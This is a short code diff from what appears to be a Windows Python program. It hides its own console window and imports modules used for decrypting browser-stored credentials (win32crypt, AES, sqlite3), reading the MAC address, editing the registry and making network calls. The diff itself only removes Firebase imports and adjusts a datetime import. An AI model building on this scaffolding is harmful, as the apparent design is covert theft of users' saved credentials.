@@ -4,9 +4,6 @@ hide = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
 
-import firebase_admin
-from firebase_admin import credentials
-from firebase_admin import firestore
 import requests
 import socket
 from threading import Thread, Lock
@@ -17,7 +14,7 @@ import sqlite3
 import win32crypt 
 from Cryptodome.Cipher import AES 
 import shutil 
-from datetime import timezone, datetime, timedelta
+from datetime import datetime, timedelta
 from getmac import get_mac_address as gma
 import winreg as reg
 import ssl
